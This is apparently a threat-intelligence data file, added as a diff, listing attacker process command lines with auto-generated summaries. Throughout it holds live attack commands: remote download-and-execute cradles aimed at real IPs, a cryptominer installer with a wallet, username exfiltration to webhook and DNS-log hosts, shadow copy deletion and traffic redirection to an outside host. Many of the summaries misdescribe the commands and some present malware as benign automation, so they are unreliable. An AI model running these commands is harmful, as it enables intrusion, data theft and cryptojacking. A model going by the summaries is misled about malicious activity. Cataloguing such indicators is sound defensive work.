@@ -1,0 +1,890 @@
+binary_ref,command_line,description,extensions,id,image,name,type,summary
+,"rundll32.exe ""%TMP%\vmtools.dll"",fjdpw03d",,,process--9b97e379-0be6-45d6-93fc-9468a27d636b,,rundll32.exe,process,"The object contains information about a process named 'rundll32.exe'. It was launched by running the command line parameter 'rundll32.exe ""%TMP%\\vmtools.dll"",fjdpw03d' from the rundll32 executable. The description of this process is currently unknown as it is represented by NaN (Not a Number)."
+,bitsadmin.exe /create test,,,process--3690b561-4abf-4dd4-973d-ff8e1969f5f5,,bitsadmin.exe,process,"The object contains a process named 'bitsadmin.exe' which was created using the command line instruction 'bitsadmin.exe /create test'. The specific details of this process are somewhat limited due to missing metadata. For example, there is no information available on when this process was created or any relevant extensions associated with it."
+,"cmd.exe /c copy c:\Windows\System32\bitsadmin.exe ""%TMP%\bypass.exe""",,,process--d81f0b50-ed32-41ae-9b3a-78af5b41d2eb,,cmd.exe,process,"The object contains a process named cmd.exe, which was executed using the binary_ref, but this value is not available. Instead, a command line script was used to copy the bitsadmin.exe file from c:\\Windows\\System32 to a temporary location %TMP% and rename it to bypass.exe.
+
+The process details are as follows:
+
+* The process name is cmd.exe.
+* It is of type process.
+* A command line script was used to execute this process, which included copying the bitsadmin.exe file from its original location and renaming it to bypass.exe.
+* No additional information such as image or description is available for this process."
+,"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"" /v a /t REG_SZ /d ""powershell"" /f",,,process--8898645f-f447-4d76-b1a2-71df1dacac14,,reg.exe,process,"The object contains information about a Windows process named reg.exe. The process is associated with the command line argument that adds a string value to the registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU, setting it to the string ""powershell"". This suggests that when reg.exe is executed, it modifies the RunMRU key to run PowerShell."
+,reg.exe delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f,,,process--9a063518-363c-4bb8-91b1-2ca9b2220a33,,reg.exe,process,The object contains information about a process named reg.exe. The process type is specified as 'process'. No further details are available due to missing or unavailable data in the provided metadata.
+,"powershell.exe -NoP -sta -NonI -W hidden -c ""$e=(New-Object System.Net.webClient).downloadString('%remotefile-66%');powershell -enc $e""",,,process--bb7c10b6-ee0a-4b33-8a3f-a8f4369969bd,,powershell.exe,process,"The object contains information about a process named 'powershell.exe'. The process is associated with the command line parameters that were used to run it. 
+
+The key characteristics of this process include:
+
+- It uses powershell.exe as its executable.
+- The command line used to start it includes options such as -NoP, -sta, and -NonI, which likely control various aspects of the PowerShell behavior.
+- A script within the command line is executed remotely using a web client.
+- Other metadata fields are missing or not available."
+,"powershell.exe -c ""Invoke-WebRequest -Uri %remotefile-11085%""",,,process--8ee4580e-29b2-4db0-a73f-fe790e49c9eb,,powershell.exe,process,"The object contains a process named 'powershell.exe' that was executed through the command line. The specific command used to run this process is 'powershell.exe -c ""Invoke-WebRequest -Uri %remotefile-11085%"""". This command attempts to execute an Invoke-WebRequest operation using the 'powershell.exe' interpreter, with a specified remote file URL as an argument."
+,"powershell.exe -c ""%TMP%\scheduledTask.ps1""",,,process--c2387fa4-4818-4317-a80f-cc72f3ca9876,,powershell.exe,process,"The object contains information about a scheduled task in PowerShell. The task is associated with the 'powershell.exe' process, which indicates that it was created or managed using this specific executable. 
+
+A command line instruction has been defined to execute the task: 'powershell.exe -c ""%TMP%\\scheduledTask.ps1""', where %TMP% represents the environment variable for the temporary directory and scheduledTask.ps1 is a script located in this directory.
+
+The object does not specify a description or an image associated with it."
+,cmstp.exe /s c:\programdata\DefenderService.inf,,,process--5c9238a9-9c18-42e6-8139-16a0b31c965c,,cmstp.exe,process,"The object contains a process named cmstp.exe that is associated with the binary reference c:\\programdata\\DefenderService.inf. This process is a standalone executable file with the extension .exe. The command-line instruction to run this process is provided by the ccmsted.exe tool, which is executed with the ""/s"" option followed by the full path of the DefenderService.inf file located at c:\\programdata. The type of this process object indicates that it is a process, further confirming its standalone nature as an executable file."
+,%TMP%\GetBrowserList.exe,,,process--534367db-6e0c-454a-a994-a7568064f023,,GetBrowserList.exe,process,"The object contains a process with the name ""GetBrowserList.exe"". The command used to launch this process is specified in the command line field. In this case, it is %TMP%\\GetBrowserList.exe.
+
+This process seems to be related to browsing or displaying information about web browsers, as indicated by its name and function. However, no additional details such as extensions, image information, or description are available for this process.
+
+It's worth noting that the binary reference field contains NaN (Not a Number), indicating that there may not be reliable information available about the actual file location of the process or executable."
+,powershell.exe -c $ep=Get-ExecutionPolicy;If ($ep -ne 'Unrestricted') {Set-ExecutionPolicy Unrestricted -scope CurrentUser -Force}; Get-ExecutionPolicy,,,process--dc976b21-2879-4308-9eea-490aff0c56fb,,powershell.exe,process,"The object contains information about a PowerShell executable process. The details of the process are as follows:
+
+- It is named ""powershell.exe"" which indicates that it is an instance of the Windows PowerShell command-line shell.
+- There is no information available on the binary reference, image location or description of this executable due to missing data in the provided dictionary.
+- The command line used to execute this process is provided. When run, it will prompt if the current execution policy is set to 'Unrestricted'. If not, it changes the execution policy for the current user session to 'Unrestricted', then retrieve the updated execution policy."
+,"cmd.exe /c cd ""%TMP%"" && echo R | powershell.exe -c ""Import-Module .\T1217.ps1; Get-BrowserData -Browser IE""",,,process--e77ca58a-2b01-465f-beb7-ed875bde04ae,,cmd.exe,process,"The object contains information about a process named cmd.exe. The process is identified by the unique identifier 'process--e77ca58a-2b01-465f-beb7-ed875bde04ae'. 
+
+The details provided indicate that this process belongs to the Windows operating system, as it executes the command 'cmd.exe /c cd ""%TMP%"" && echo R | powershell.exe -c ""Import-Module .\\T1217.ps1; Get-BrowserData -Browser IE""', which utilizes PowerShell and its modules. 
+
+The command appears to be a custom script designed to collect browser data, specifically targeting Internet Explorer (IE) in this case. This process is likely used for malicious purposes, given the involvement of PowerShell and the importation of a module named 'T1217'."
+,"cmd.exe /c for %G in (.pdf, .doc, .wps, .docx, .ppt, .xls, .xlsx, .pptx, .rtf) do forfiles /p ""C:"" /s /M *%G /C ""cmd /c echo @PATH""",,,process--ffea08af-708e-4683-99e9-70d66bdae929,,cmd.exe,process,"The object contains a process named 'cmd.exe' which is associated with the Windows command line. This process has an identifier of 'process--ffea08af-708e-4683-99e9-70d66bdae929'. 
+
+Specifically, this process matches a command line that iterates through certain file extensions such as .pdf, .doc, .wps, .docx, .ppt, .xls, .xlsx, .pptx, and .rtf. It uses the 'forfiles' tool to search for files with these specified extensions on the C: drive.
+
+The process runs a command that echoes the path of each matched file using the cmd /c echo command. The output is directed to where 'cmd.exe' resides in its own executable file, suggesting an attempt at echoing or logging the results back into the same location from which it was invoked.
+
+No further information about this specific instance can be deduced due to missing metadata fields such as timestamps and image data."
+,net.exe user /domain,,,process--57be498f-ab66-412d-a4d8-25430f2def67,,net.exe,process,"The object contains a process information dictionary that includes the following details:
+
+The process name is net.exe, which is the command-line executable used for network-related tasks.
+
+The type of this process is specified as 'process', indicating that it is a running program on the system.
+
+A specific command line was executed to manage users in the domain: 'net.exe user /domain'. This suggests that the process is related to managing and controlling access to network resources.
+
+Unfortunately, some essential information such as the image or binary reference of this executable cannot be found."
+,ipconfig.exe /all,,,process--fe61c27d-7a54-4fc3-8628-a54039f7d620,,ipconfig.exe,process,"The object contains information about a process named ipconfig.exe. The process is associated with the Windows operating system and is used to display network configuration settings.
+
+There is no specific binary reference provided for this process. However, based on its name, it can be inferred that ipconfig.exe is the executable file responsible for managing IP configuration settings in Windows.
+
+The command line used to execute this process is 'ipconfig.exe /all', which suggests that it is intended to display all available network configuration information.
+
+No extensions or image data are provided for this process."
+,netstat -nao,,,process--fdb28820-a29f-47ca-a665-ba09f64b08f5,,netstat,process,"The object contains information about a process named 'netstat' that is identified by its unique identifier 'fdb28820-a29f-47ca-a665-ba09f64b08f5'. The details of this process include the command used to retrieve information about it, which was 'netstat -nao'.
+
+The process is categorized under a specific type, designated as 'process', and has no associated binary reference or image."
+,whoami.exe /all,,,process--fd8f6bf5-2c11-4d03-8140-f24f21ce9073,,whoami.exe,process,"The object contains a process named 'whoami.exe' that was run using the command line 'whoami.exe /all'. It is not part of any binary reference. The file name is 'whoami.exe', and it belongs to the type 'process'. There is no extension associated with this process, nor is there an image or description available."
+,tasklist.exe /v,,,process--5b8b1c45-8b21-46b7-8536-e4c2f11922c9,,tasklist.exe,process,"The object contains information about a Windows process. The process name is ""tasklist.exe"" and its type is classified as a process. There is no available binary reference for this process, nor are there any command line arguments associated with it.
+
+It's worth noting that the object does not provide any detailed description or extensions related to this process."
+,%TMP%\chrome_inject.exe -s edge,,,process--084f7913-588c-4eef-a192-526110a05109,,chrome_inject.exe,process,"The object contains data related to a process named ""chrome_inject.exe"". 
+
+This process is associated with the Chrome browser, as indicated by the presence of the file name 'chrome_inject.exe' in the command line parameter. The command line parameter itself suggests that this process is an injected component of the Edge browser, denoted by the use of the '-s' flag.
+
+The object does not contain any information about its image or extension associated with it, as these fields are marked as null (nan). 
+
+However, there is a 'description' field present but it is also marked as null."
+,"nslookup ""$env:USERNAME.910cf351-a05d-4f67-ab8e-6f62cfa8e26d.dnshook.site""",,,process--550f076c-ef80-4865-a3c2-ce2bcff7639b,,,process,"The object contains a process entity with the following characteristics:
+
+* It is not associated with any binary reference.
+* The command line used to execute this process is a nslookup command that attempts to look up information about a domain name. The command specifically targets a user's environment variable, which includes their username, followed by a unique identifier for the domain hook site.
+
+Unfortunately, there is no available information regarding the description of the process or any extensions associated with it.
+
+It appears that this process is categorized as a process entity under the type 'process'."
+,"cmd /c curl ""http://webhook.site/910cf351-a05d-4f67-ab8e-6f62cfa8e26d?$env:USERNAME""",,,process--b061763e-e78a-48e7-8cad-cda2f992905f,,,process,"The object contains a process-related data set that includes the following information:
+
+- A command line for execution: 'cmd /c curl ""http://webhook.site/910cf351-a05d-4f67-ab8e-6f62cfa8e26d?$env:USERNAME""'
+- The purpose of this command is unclear as it appears to be an automated script designed to execute a specific task, but the details are not explicitly stated.
+- There is no information available on any environmental variables that may be involved in this process due to 'nan' values for 'binary_ref', 'description', and 'extensions'."
+,"$a=$env:APPDATA;copy c:\programdata\testtemp.ini ""$a\Microsoft\Outlook\VbaProject.OTM""",,,process--fad933f8-5305-4b4d-a20d-ce999017fb04,,,process,"The object contains a process with the following characteristics:
+
+It appears to be related to Microsoft Outlook, specifically VbaProject.OTM, which is likely an executable file used by the application.
+
+The command line provided suggests that the process is attempting to copy a configuration file named testtemp.ini from a specific location to a destination within the user's APPDATA environment variable.
+
+Unfortunately, the details of this process are somewhat unclear due to missing or unavailable metadata fields."
+,"CmD.exe /C rundll32 %tmp%\license.ini,IEX A\x12\x0cC",,,process--e1058aa6-985a-4426-855e-f45cb1fa4453,,CmD.exe,process,"The object contains details about a Windows process named 'CmD.exe'. The process is identified by its ID, 'process--e1058aa6-985a-4426-855e-f45cb1fa4453'.
+
+The command-line argument associated with this process is 'CmD.exe /C rundll32 %tmp%\\license.ini,IEX A\\x12\\x0cC'. This indicates that the process executes a command using the 'rundll32' utility, specifying a path to a license file in the format of 'IEX A\\x12\\x0cC', which appears to be related to the Microsoft Internet Explorer.
+
+The process has no associated image or binary reference."
+,"powershell -c ""40138*41979""",,,process--491bf112-c43b-4911-8c2e-114201a0c139,,powershell.exe,process,"The object contains a process named ""powershell.exe"" which is identified by its command line as ""powershell -c \""40138*41979\"""". This command appears to be related to scripting and executing shell commands. The process type is categorized as ""process"", indicating that it refers to an active running instance of the Windows operating system or a specific executable application."
+,"powershell -c ""40320*43488""",,,process--1935c285-6f38-49b5-bb25-aecbfb584093,,powershell.exe,process,"The object contains a process-related data structure. This structure includes information about a running process named ""powershell.exe"". The key details of this process are:
+
+- The command line used to execute the process is 'powershell -c ""40320*43488""'. This suggests that the process is related to PowerShell and involves some form of arithmetic operation.
+- There appears to be no information about a binary reference, extensions, or an image associated with this process."
+,powershell -enc <base64>,,,process--f4cea450-385b-4718-bbab-bff81474f353,,powershell.exe,process,"The object contains the following information about a process:
+
+It is identified by the name ""powershell.exe"", which is associated with PowerShell, a command-line shell.
+
+The command to execute this process is provided, which is a powershell command encoded in base64. This suggests that the process is being executed from within another program or script, and the encoding is necessary because the raw base64 string would not be executable directly.
+
+There are no additional details such as image information, extensions associated with the process, or any other metadata provided."
+,IEX (New-Object System.Net.Webclient).DownloadString('http://23.235.188.3:652/qMqSb'),,,process--5cb2f316-517f-4752-a547-763e1e8cc4de,,powershell.exe,process,"The object contains a PowerShell executable with the following characteristics:
+
+It appears to be a Windows process identified by its filename, 'powershell.exe'. The command-line string associated with this process is instructing IEX to execute a script that downloads data from a specific URL. This suggests that the process may be used for some form of automated scripting or data retrieval.
+
+The URL specified in the command-line string points to an IP address at 23.235.188.3, which appears to be a cloud-based service providing access to various resources. The fact that the IEX command is being used to execute this script indicates that the process may be part of a larger automation framework or workflow.
+
+In terms of its behavior, the PowerShell executable likely executes the provided script and downloads the specified data. This could be for a variety of purposes, such as data scraping, web scraping, or automated task execution.
+
+It is worth noting that the 'binary_ref' field in the metadata appears to be missing (NaN), which means that there may not be any additional information available about the binary itself."
+,IEX (New-Object System.Net.Webclient).DownloadString(''),,,process--2eb72d68-d9cc-4f04-ab3d-883a15d08a9b,,powershell.exe,process,"The object contains information about a process running on the system. The process is identified by its name, which is 'powershell.exe'. This suggests that PowerShell is currently executing on the system.
+
+According to the command line provided, the process was initiated using the New-Object cmdlet in combination with the System.Net.Webclient class. However, there seems to be an issue as indicated by the binary reference being NaN (Not a Number). The code appears to be attempting to download a string from an empty URL, which may be causing the problem.
+
+There is no available description or image information associated with this process."
+,powershell.exe -enc <base64>,,,process--c79bfb16-2549-4b99-8561-cddc38e1661d,,powershell.exe,process,"The object contains information about a process named 'powershell.exe'. The command line used to execute this process is 'powershell.exe -enc <base64>', which suggests that the base64 encoding of an executable has been provided.
+
+Further details are lacking, as the values for 'binary_ref' and 'image' are not available. However, it can be noted that 'extensions' does not contain any specific information about this process.
+
+It's worth noting that there is no description or other relevant metadata associated with this process, making it unclear why this process was executed or what its purpose is."
+,wget http://162.215.170.26:3000/sex.sh && bash sex.sh,,,process--73f903e1-5f40-48bb-8654-6f82d299b178,,wget,process,"The object contains a process named 'wget' that was initiated from the command line. The process involved downloading a script from a specified URL using the 'wget' command. The script, once downloaded, was executed using the 'bash' command to run the content of the script ('sex.sh'). The description and metadata fields are currently empty."
+,wget http://46.36.37.85:12000/sex.sh && bash sex.sh,,,process--5ea6b87b-2129-44f6-8d6d-5333a2f0dedc,,wget,process,"The object contains a single process, specifically a command-line instruction known as ""wget"". This process is utilized for downloading files from remote servers. The wget command is executed by combining it with another shell script named ""sex.sh"", which is then run using the bash interpreter. This integration allows for the automation of file downloads and potentially other tasks through this single command."
+,wget http://vps-zap812595-1.zap-srv.com:3000/sex.sh && bash sex.sh,,,process--78623219-15b8-4504-a751-5988338366b1,,wget,process,"The object contains a detailed analysis of the provided data, which appears to be a record of a process or task.
+
+The data includes information about a command-line operation that was performed on a system. The key details are:
+
+*   A wget command was executed from the command line.
+*   The wget command retrieved a script named 'sex.sh' from a specified URL.
+*   After downloading and executing the script, a bash shell command was invoked to run the contents of the script.
+
+No further information is available regarding the nature or purpose of the content being downloaded or processed."
+,curl 2f7ac6.ceye.io,,,process--40dcb3c7-5a9f-45b8-a4a4-8f543430ff51,,curl,process,"The object contains a dictionary representing process information. The process has been identified by the key 'id', which is assigned a unique identifier as 'process--40dcb3c7-5a9f-45b8-a4a4-8f543430ff51'. The name of the process is 'curl' and its type is classified as 'process'.
+
+Additionally, the object contains other information about the process. However, some fields seem to be missing or not available due to the presence of NaN (Not a Number) values in the dictionary."
+,curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 44VvVLU2Vmja6gTMbhNHAzc7heYTiT7VmQEXkjdaYo6K41WqH8qWw1CL8wKAAgz5xLYT3XL3pb9KCUZS7PPZbzUGCCpZ9Ee,,,process--006e3b14-dc8f-4e4e-b08f-c8d13419af98,,curl,process,"The object contains a process summary. 
+
+The process details include:
+- A binary reference field, which is not specified.
+- The command line used to launch the process, involving curl and executing a GitHub script to download and run a miner setup script.
+- No description of the process provided.
+- There are no extensions associated with this process.
+- An image associated with this process is not present in the data.
+- The name of the process is 'curl'.
+- The type of process is described as 'process'."
+,ping -c 7 45.157.233.80,,,process--1db7f902-07ca-403a-ab18-6cd89260e3b2,,ping,process,"The object contains a process named 'ping' of type 'process'. The command to execute the process is specified in the 'command_line' field, which reads 'ping -c 7 45.157.233.80'. This suggests that the 'ping' process is intended to send an ICMP echo request to the IP address '45.157.233.80', with a maximum of 7 packets being sent in succession."
+,ping 5axzi7.dnslog.cn,,,process--3ff8303d-8011-4538-bbcd-089418fe0ae8,,ping,process,"The object contains a process details dictionary containing the following information:
+
+It appears to be a system command that executes a ping operation on a specific DNS server IP address. The specifics of the ping request are 'ping 5axzi7.dnslog.cn'. 
+
+No further information is provided in the metadata."
+,"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('hxxp://87.120.219.26/P9m4H7S2FqDTof')""",,,process--2cc01c33-9180-4cb1-907d-3dde86efaeeb,,powershell.exe,process,"The object contains a process details object with the following attributes:
+
+* The binary reference is not specified.
+* A command line is provided to execute a PowerShell script. Specifically, it instructs PowerShell to bypass execution policy and download a script from a suspicious URL, which then executes an unknown command.
+* The description of the process is not available.
+* There are no file extensions associated with this process.
+* An image hash or fingerprint is not provided for this process.
+* The name of the executable is simply ""powershell.exe"".
+* This is classified as a process type."
+,"powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""<Path/To/Payload.ps1>""",,,process--68a84905-0200-4ea7-970e-f99cf34072d3,,powershell.exe,process,"The object contains a process information summary. 
+
+The process name is powershell.exe, which indicates that it belongs to the PowerShell command-line shell. The command line provided suggests that this instance of PowerShell was launched using the powershell.exe executable and executed a script located at ""<Path/To/Payload.ps1>"". 
+
+It appears that the PowerShell script is designed to bypass security restrictions and execute arbitrary code on the system, as indicated by the ""-ExecutionPolicy Bypass"" option in the command line. This suggests that the payload script may contain malicious intent or be used for unauthorized access."
+,mongod [options],,"{""docker"": {""container_name_pattern"": ""mongo*, *mongodb*, prod-mongo-*""}}",process--07163aa5-ad87-419d-b1ba-d2892ea0298f,,mongod,process,"The object contains a detailed description of a MongoDB process. 
+
+It appears that the process is named ""mongod"" which is likely the command-line interface for starting and managing a MongoDB server. The extensions field provides additional configuration details for Docker container management, specifically indicating that container names should match certain patterns such as ""mongo*"", ""*mongodb*"", or ""prod-mongo-*""."
+,cmd.exe /C echo curl.exe http://<redacted>.md | cmd > c:\Programdata\WindowsUpdateTask_H.tmp 2>&1,,,process--b319bff3-12e0-4741-aefa-0890b758b016,,,process,"The object contains a Windows process with a specific command-line argument that suggests its purpose. 
+
+A process named 'process--b319bff3-12e0-4741-aefa-0890b758b016' is identified by its unique identifier, which is embedded within the 'id' field of the provided data structure. The task at hand seems to involve a command-line interface that executes a script using the Windows Command Prompt.
+
+The command specified in the 'command_line' field includes an executable named 'curl.exe', which is commonly used for transferring data from one location to another over the internet. This command also utilizes the 'echo' command to append the URL of a web page, followed by pipe operations to redirect input from the curl command and output to a file located at 'c:\\Programdata\\WindowsUpdateTask_H.tmp'. 
+
+It is worth noting that there are specific metadata fields such as timestamps and IDs which are excluded in this analysis due to their non-relevant nature."
+,cmd.exe /C echo curl.exe http://<redacted>.md/about.mp4 -o c:\programdata\1.rar | cmd > c:\Programdata\WindowsUpdateTask_D.tmp 2>&1,,,process--2e7ff525-4d01-402e-95ca-55ef9c28a7d7,,,process,"The object contains a process with the following details:
+
+The process is identified by its unique ID, 'process--2e7ff525-4d01-402e-95ca-55ef9c28a7d7'. This information suggests that the process belongs to an unknown or unidentified system or application.
+
+The process command line is provided as a string, indicating that it contains a series of instructions for the operating system. The command starts with 'cmd.exe /C', which is a common way to execute commands in Windows.
+
+The process command executes the following sequence:
+
+1. It runs 'curl.exe' and uses it to download a file from a specific URL.
+2. The downloaded file is saved as 'about.mp4' with a ransomware extension ('rar') in the specified directory location.
+3. The output of this process is redirected to another command (stored in the Windows Update Task temporary file) using 'cmd >'.
+
+The only metadata field provided for this object is its type, which has been classified as 'process'."
+,"cmd.exe /C dir ""c:\program Files"" > c:\Programdata\WindowsUpdateTask_X.tmp 2>&1",,,process--50183eb6-a25a-45af-892f-dd8becdfb8a9,,,process,"The object contains a process information record. The data includes details about the process running on the system. 
+
+Specifically, it is identified by its unique identifier 'process--50183eb6-a25a-45af-892f-dd8becdfb8a9'. However, some crucial information such as an image or binary reference are not available. Additionally, the command line used to start this process can be traced back to a Windows command-line interface.
+
+The execution of the 'dir' command in the specified directory 'c:\program files', followed by redirection of both standard output and error streams to create a temporary file at 'c:\\Programdata\\WindowsUpdateTask_X.tmp'. This information suggests that this task may relate to the system's Windows Update functionality."
+,"cmd.exe /C ""c:\program files\WinRAR\rar.exe"" x c:\programdata\1.rar c:\programdata\microsoft\AppV\app > c:\Programdata\WindowsUpdateTask_z.tmp 2>&1",,,process--7513feb4-c046-48d9-b14d-5372127dbbb2,,,process,"The object contains information about a Windows process. The process details are as follows:
+
+It is associated with the command line parameter which executes the WinRAR program to open an archive file located at c:\\programdata\\1.rar. The output of the process will be redirected to a temporary file named z.tmp.
+
+There is no available binary reference or image information available for this process."
+,"cmd.exe /C powershell.exe -c import-vm -path ""c:\programdata\microsoft\AppV\app\Virtual Machines\1DBCC80B-5803-4AF1-8772-712C688F408A.vmcx"" -Copy -GenerateNewId > c:\Programdata\WindowsUpdateTask_t.tmp 2>&1",,,process--05aee989-b3b8-43fb-9ab3-2bdd8ef00ba2,,,process,"The object contains a process execution result. Here's a detailed summary of the data:
+
+The object represents a PowerShell command that was executed to import a virtual machine (VM) from a specific path on disk. The command is as follows: cmd.exe /C powershell.exe -c import-vm -path ""c:\\programdata\\microsoft\\AppV\\app\\Virtual Machines\\1DBCC80B-5803-4AF1-8772-712C688F408A.vmcx"" -Copy -GenerateNewId > c:\\Programdata\\WindowsUpdateTask_t.tmp 2>&1. 
+
+This command is used to import a VM from the given path, and it generates a new ID for the imported VM. The output of this command is redirected to a temporary file ""c:\\Programdata\\WindowsUpdateTask_t.tmp"". The command also includes error handling options, which means that any errors that occur during execution are captured in the standard output.
+
+However, the object does not contain any information about the actual result of the import operation. For example, whether the import was successful or if there were any errors. This suggests that the object may be incomplete or missing some critical metadata."
+,cmd.exe /C powershell.exe -c Start-VM -name WSL > c:\Programdata\WindowsUpdateTask_R.tmp 2>&1,,,process--0cac37bb-f3a6-4000-8325-977b071c7a04,,,process,"The object contains a process execution record. The record includes details about the command line used to execute the process.
+
+Specifically, the object was created using the Windows operating system's cmd.exe command-line tool, which invokes powershell.exe to run a script that starts a virtual machine named WSL. 
+
+The output of this command is redirected to a file located at C:\ProgramData\WindowsUpdateTask_R.tmp and both the standard output and standard error streams are captured in this process."
+,dism /online /disable-feature /FeatureName:microsoft-hyper-v-Management-clients /norestart,,,process--13cc4a14-cbbe-4f31-859c-be5fd4704838,,,process,"The object contains a process record with the following details:
+
+The process is related to disabling Microsoft Hyper-V Management Clients. The command line used to disable this feature was 'dism /online /disable-feature /FeatureName:microsoft-hyper-v-Management-clients /norestart'. 
+
+This action does not require a restart after execution, which suggests that it was performed during an online operation without interrupting the system's normal functioning."
+,dism /online /enable-feature /All /LimitAccess /FeatureName:microsoft-hyper-v /norestart,,,process--c2c7c2ea-8d3b-4ff6-90e1-09c635d12497,,,process,"The object contains a Windows process object. 
+
+It is identified by a unique identifier, which is the command line used to enable the Microsoft Hyper-V feature on the system. The specific command used is 'dism /online /enable-feature /All /LimitAccess /FeatureName:microsoft-hyper-v /norestart'."
+,cmd.exe /C C:\Windows\ps1\utc.exe 45.43.91.10:443 --key <redacted> > C:\Programdata\regid_1992 2>&1,,,process--63e9f0d6-b2fb-4263-9446-0158ca93fc7d,,,process,"The object contains information about a process. 
+
+It appears to be a PowerShell command that executes an external executable named 'utc.exe' on a specified IP address (45.43.91.10) using the provided key. The command is executed from within Windows and redirects both the standard output and error streams to a file located in the 'C:\\Programdata\\regid_1992' directory.
+
+The specific details of the executable, such as its location ('C:\\Windows\\ps1') and its name ('utc.exe'), are not provided. 
+
+Overall, this information suggests that the process is related to some sort of network communication or data exchange."
+,cmd.exe /C curl http://45.43.91.10:443 > C:\Programdata\regid_1992 2>&1,,,process--2803bb57-afcd-4773-aee3-d6f476ae4238,,,process,"The object contains a detailed information about a process. The key characteristics of this process are:
+
+- It is not a Windows binary reference.
+- The command used to run the process was specified in the command line parameter, which is 'cmd.exe /C curl http://45.43.91.10:443 > C:\\Programdata\\regid_1992 2>&1'.
+- Unfortunately, there seems to be an issue with the provided data as it contains some missing values.
+- It appears that no further information could be found in regards to this process due to lack of available metadata."
+,cmd.exe /C curl ipinfo.io > C:\Programdata\regid_1992 2>&1,,,process--db4377b1-7634-455c-8f08-14204c136b14,,,process,"The object contains a process with the following characteristics:
+
+The process is associated with an invalid binary reference.
+
+A command line was used to execute this process, which involves using the Windows Command Prompt (cmd.exe) to run a curl command. The specific command executed is 'curl ipinfo.io > C:\\Programdata\\regid_1992 2>&1'. This suggests that the process is attempting to download information from ipinfo.io and save it to a file named 'regid_1992' in the specified location.
+
+The object also lacks detailed descriptions of its purpose or any additional context about the command line used."
+,sshd -p 31637,,,process--72fcaa76-bee6-43a0-9eab-2d2314b17b7d,,,process,"The object contains a detailed entry for a process, which includes the following information:
+
+* The command line argument used to initiate the process: 'sshd -p 31637'. This suggests that the process is related to the SSH server and was started with a specific port number.
+* The type of process is described as 'process', indicating that it is a system-level process rather than an application or service.
+* Unfortunately, the object does not contain any additional information about the process, such as its description, image, binary reference, extensions, or name."
+,unset HISTFILE,,,process--8839bdca-386e-48e7-a44e-dc89b9e6dc19,,,process,"The object contains a process with the following characteristics:
+
+It was started by running the command-line instruction ""unset HISTFILE"", which suggests that this process is related to resetting or modifying the system's history settings. The process has a unique identifier, but its description remains unspecified.
+
+There is no information available on whether this process uses any specific file extensions or has been assigned a binary reference."
+,iptables -t nat -A PREROUTING -p tcp --dport 443 -s <victim_ip> -j DNAT --to-destination 88.198.91.116:22,,,process--a94e523c-a19d-45a1-88ad-52c8f5a4861a,,,process,"The object contains a security-related process with the following characteristics:
+
+- It appears to be related to network traffic manipulation, specifically NAT (Network Address Translation) rules for incoming TCP connections on port 443.
+- The process targets a specific IP address of a victim machine (<victim_ip>), and all incoming traffic destined for that IP is redirected to a different IP address (88.198.91.116).
+- The redirection is done before the traffic reaches its final destination, as indicated by the ""PREROUTING"" stage in the NAT rules.
+- The process uses the iptables command-line tool to configure these rules, suggesting it may be part of an automation or orchestration system for managing network security configurations."
+,klist purge,,,process--f1790bd2-3e90-4e02-bb4b-b10bc84a027b,,,process,"The object contains a dictionary representing a process entity. The details of the process are as follows:
+
+The process is identified by an unique ID, 'process--f1790bd2-3e90-4e02-bb4b-b10bc84a027b'. 
+
+A command line instruction associated with the process is given, which is 'klist purge'.
+
+An extension of this process is not provided."
+,net use \\<redacted>\C$ /user:<username> <password>,,,process--75d216df-ffaf-47d0-abed-22c34127d75d,,,process,"The object contains information about a process identified by the key 'id'. The process has been detected running under Windows, utilizing a command line to establish a network connection.
+
+Further details on this process reveal that it is attempting to access a network share located at '\\<redacted>\\C$' through the utilization of the net use command-line interface. This action is being carried out by user '<username>' and password '<password>', which are both redacted for security reasons.
+
+Unfortunately, no specific information about this process, such as its name or binary identifier, can be determined from the provided data."
+,dir \\<redacted>\C$\users,,,process--618d8dd4-c265-48c4-b4e7-c1afb9f2d4c4,,,process,"The object contains a process information summary. 
+
+The provided data contains details about a specific process, which is characterized by the following attributes:
+
+*   The process command line was executed using 'dir' command. 
+*   The command line path is given as '<redacted>\\C$\\users'. However, the redacted part of the path is not clear.
+*   There are no available details about file extensions or images associated with this process.
+*   It seems like there's no description provided for this process.
+
+In summary, the only piece of information that can be extracted from the data without additional context is that a 'dir' command was executed on '<redacted>\\C$\\users'."
+,net use /delete \\<redacted>\C$,,,process--2ee2d65a-85ee-40bf-97f7-d8aba7a4d491,,,process,"The object contains a process with the following characteristics:
+
+It is a process with a unique identifier of 'process--2ee2d65a-85ee-40bf-97f7-d8aba7a4d491'.
+The process has a command line that starts with 'net use /delete \\<redacted>\\C$', indicating it is related to the deletion of a network share.
+There is no available information about its binary reference, image, description, extensions, or name."
+,powershell -w hidden -nop -c $a='https://2n';$b='o.co/2OArm3';iex(irm ($a+$b)),,,process--03ab0591-314b-4a31-9283-767584c2473e,,,process,"The object contains a PowerShell process with the following attributes:
+
+*   The command-line argument used to launch the process is ""powershell -w hidden -nop -c $a='https://2n';$b='o.co/2OArm3';iex(irm ($a+$b))"". This command uses the `powershell` executable, runs in hidden mode, and executes a script that combines two URLs and executes an `irm` (read-item) function on their concatenation.
+*   The process is identified by its unique ID ""process--03ab0591-314b-4a31-9283-767584c2473e"".
+*   The object lacks descriptive metadata, including a description and image URL."
+,mshta.exe hxxps://2no[.]co/2Od3Q3 =-+2346823,,,process--2468d757-8359-4739-a3a7-34f8ab90f4bf,,,process,The object contains a malicious process identified by the unique identifier 'process--2468d757-8359-4739-a3a7-34f8ab90f4bf'. The process is associated with an executable file 'mshta.exe' that loads and executes a malicious URL through the 'hxxps://2no[.]co/2Od3Q3 =-+2346823' command line.
+,"cmd.exe /c C:\Windows\System32\wbem\WMIC.exe shadowcopy where ""ID='%s'"" delete",,,process--019abc96-6593-4e1e-8170-4e3c3089149b,,,process,"The object contains a Windows process with the name 'process--019abc96-6593-4e1e-8170-4e3c3089149b'. The command to delete this process is specified in the binary reference field, which points to the WMI (Windows Management Instrumentation) utility 'WMIC.exe'. This utility will be used to execute a command that deletes the process with the specified ID."
